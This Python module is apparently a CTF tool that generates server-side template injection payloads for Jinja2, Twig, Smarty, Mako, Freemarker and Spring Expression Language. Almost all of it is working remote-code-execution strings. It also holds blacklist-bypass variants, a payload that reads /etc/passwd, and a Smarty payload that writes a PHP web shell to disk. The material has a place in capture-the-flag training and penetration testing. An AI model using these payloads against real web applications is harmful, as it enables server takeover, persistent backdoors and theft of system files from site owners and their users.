"""
SSTI (Server-Side Template Injection) Payload Crafter & Filter Bypasser for Web CTF.
Covers Jinja2, Twig, Smarty, Mako, Freemarker, Pebble, Velocity, and Spring Expression Language (SpEL).
"""

from typing import List, Dict

DETECTION_PAYLOADS = [
    {"engine": "Universal Test", "payload": "${7*7}", "desc": "Tests if template expression evaluates"},
    {"engine": "Universal Test", "payload": "{{7*7}}", "desc": "Common curly brace template test (49)"},
    {"engine": "Universal Test", "payload": "#{7*7}", "desc": "Ruby / Java template test (49)"},
    {"engine": "Universal Test", "payload": "<%= 7*7 %>", "desc": "ERB / EJS syntax test (49)"},
    {"engine": "Universal Test", "payload": "*{7*7}", "desc": "Thymeleaf syntax test (49)"},
    {"engine": "Universal Test", "payload": "@(7*7)", "desc": "Razor syntax test (49)"},
]

def get_ssti_detection_tree() -> str:
    """ASCII Decision Tree for identifying template engine."""
    return """
                     ${7*7}
                    /      \\
                49 /        \\ ${7*7}
                  /          \\
            a{*comment*}b    {{7*7}}
             /        \\      /      \\
        ab  /    a{*}b \\  49/        \\ {{7*7}}
           /            \\  /          \\
        Smarty        Mako {{7*'7'}}   Twig / Jinja2 / Freemarker
                          /        \\
                   7777777 /          \\ 49
                          /            \\
                       Jinja2         Twig / Freemarker
    """

def get_jinja2_payloads(cmd: str = "id") -> List[Dict[str, str]]:
    """Generate comprehensive Jinja2 SSTI payloads with filter bypasses."""
    return [
        {
            "name": "Jinja2 Standard Lipsum RCE",
            "payload": f"{{{{ lipsum.__globals__['os'].popen('{cmd}').read() }}}}",
            "desc": "Shortest modern Jinja2 RCE using lipsum helper globals."
        },
        {
            "name": "Jinja2 Cycler RCE",
            "payload": f"{{{{ cycler.__init__.__globals__.os.popen('{cmd}').read() }}}}",
            "desc": "Alternative global namespace via cycler object."
        },
        {
            "name": "Jinja2 Joiner RCE",
            "payload": f"{{{{ joiner.__init__.__globals__.os.popen('{cmd}').read() }}}}",
            "desc": "Global namespace access via joiner."
        },
        {
            "name": "Jinja2 Config Object RCE",
            "payload": f"{{{{ config.__class__.__init__.__globals__['os'].popen('{cmd}').read() }}}}",
            "desc": "Access os module through Flask config object."
        },
        {
            "name": "Jinja2 Class MRO Subclasses Search",
            "payload": f"{{{{ ().__class__.__mro__[1].__subclasses__() }}}}",
            "desc": "Dump all loaded subclasses to find subprocess.Popen / os._wrap_close."
        },
        {
            "name": "Jinja2 Bypass: No Dots (attr filter)",
            "payload": f"{{{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}}}",
            "desc": "Bypasses dot '.' filter using Jinja2 `attr()` function."
        },
        {
            "name": "Jinja2 Bypass: No Underscores (request.args)",
            "payload": "{{ request[request.args.a][request.args.b]['os'].popen(request.args.c).read() }}?a=application&b=__globals__&c=" + cmd,
            "desc": "Passes forbidden underscore keywords via URL GET query parameters."
        },
        {
            "name": "Jinja2 Bypass: Hex / Octal Escape Attributes",
            "payload": f"{{{{ lipsum['\\x5f\\x5fglobals\\x5f\\x5f']['os']['popen']('{cmd}')['read']() }}}}",
            "desc": "Hex encoded `__globals__` to evade string blacklist."
        },
        {
            "name": "Jinja2 Bypass: String Concatenation (~)",
            "payload": f"{{{{ lipsum['__glo' ~ 'bals__']['os']['po' ~ 'pen']('{cmd}')['re' ~ 'ad']() }}}}",
            "desc": "Bypasses keyword blacklists using Jinja2 tilde '~' string concat."
        },
        {
            "name": "Jinja2 Bypass: Blind Time-based Delay (Sleep)",
            "payload": f"{{{{ lipsum.__globals__['os'].popen('sleep 5').read() }}}}",
            "desc": "Time-based verification when template output is suppressed."
        },
    ]

def get_twig_payloads(cmd: str = "id") -> List[Dict[str, str]]:
    """Generate Twig (PHP) SSTI payloads."""
    return [
        {
            "name": "Twig 1.x Filter Callback RCE",
            "payload": f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{cmd}')}}}}",
            "desc": "Classic Twig 1.x RCE via registerUndefinedFilterCallback."
        },
        {
            "name": "Twig 2.x/3.x Array Filter RCE",
            "payload": f"{{{{ ['{cmd}']|filter('system') }}}}",
            "desc": "Twig 2.x / 3.x RCE via filter map."
        },
        {
            "name": "Twig Array Map Passthru",
            "payload": f"{{{{ ['{cmd}']|map('passthru') }}}}",
            "desc": "Alternative PHP execution using map('passthru')."
        },
        {
            "name": "Twig File Read",
            "payload": "{{ '/etc/passwd'|file_excerpt(1, 30) }}",
            "desc": "Arbitrary file read via file_excerpt filter."
        }
    ]

def get_smarty_payloads(cmd: str = "id") -> List[Dict[str, str]]:
    """Generate Smarty (PHP) SSTI payloads."""
    return [
        {
            "name": "Smarty {php} Tag RCE",
            "payload": f"{{php}}system('{cmd}');{{/php}}",
            "desc": "Direct PHP tag execution (Smarty <= 3.1.29)."
        },
        {
            "name": "Smarty Write File RCE",
            "payload": f"{{Smarty_Internal_Write_File::writeFile('/tmp/shell.php','<?php system($_GET[\"cmd\"]); ?>', $smarty)}}",
            "desc": "Write arbitrary PHP shell to disk."
        },
        {
            "name": "Smarty System Function Call",
            "payload": f"{{system('{cmd}')}}",
            "desc": "Direct function invocation in Smarty templates."
        },
        {
            "name": "Smarty Version Probe",
            "payload": "{$smarty.version}",
            "desc": "Print installed Smarty version."
        }
    ]

def get_mako_payloads(cmd: str = "id") -> List[Dict[str, str]]:
    """Generate Mako (Python) SSTI payloads."""
    return [
        {
            "name": "Mako Direct Import RCE",
            "payload": f"${{__import__('os').popen('{cmd}').read()}}",
            "desc": "Direct Python __import__ execution inside Mako template."
        },
        {
            "name": "Mako Module Cache RCE",
            "payload": f"${{self.module.cache.util.os.popen('{cmd}').read()}}",
            "desc": "RCE via self.module.cache."
        },
        {
            "name": "Mako Code Block RCE",
            "payload": f"<%import os\nx = os.popen('{cmd}').read()\n%>${{x}}",
            "desc": "Multi-line Mako code block."
        }
    ]

def get_freemarker_payloads(cmd: str = "id") -> List[Dict[str, str]]:
    """Generate Freemarker (Java) SSTI payloads."""
    return [
        {
            "name": "Freemarker Execute Class RCE",
            "payload": f"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ ex(\"{cmd}\") }}",
            "desc": "Instantiate Execute utility class to run OS commands."
        },
        {
            "name": "Freemarker ObjectConstructor RCE",
            "payload": f"<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${{ ob(\"java.lang.ProcessBuilder\",[\"{cmd}\"]).start() }}",
            "desc": "ProcessBuilder execution via ObjectConstructor."
        }
    ]

def get_spel_payloads(cmd: str = "id") -> List[Dict[str, str]]:
    """Generate Spring Expression Language (SpEL) payloads."""
    return [
        {
            "name": "SpEL Runtime Exec RCE",
            "payload": f"${{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}",
            "desc": "Standard Spring Expression Language Runtime RCE."
        },
        {
            "name": "SpEL ProcessBuilder RCE (Readable Output)",
            "payload": f"${{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{cmd}').getInputStream())}}",
            "desc": "SpEL execution with command output captured to string."
        }
    ]

def get_all_ssti_engines() -> Dict[str, callable]:
    """Map template engine names to their payload generator functions."""
    return {
        "jinja2": get_jinja2_payloads,
        "twig": get_twig_payloads,
        "smarty": get_smarty_payloads,
        "mako": get_mako_payloads,
        "freemarker": get_freemarker_payloads,
        "spel": get_spel_payloads
    }
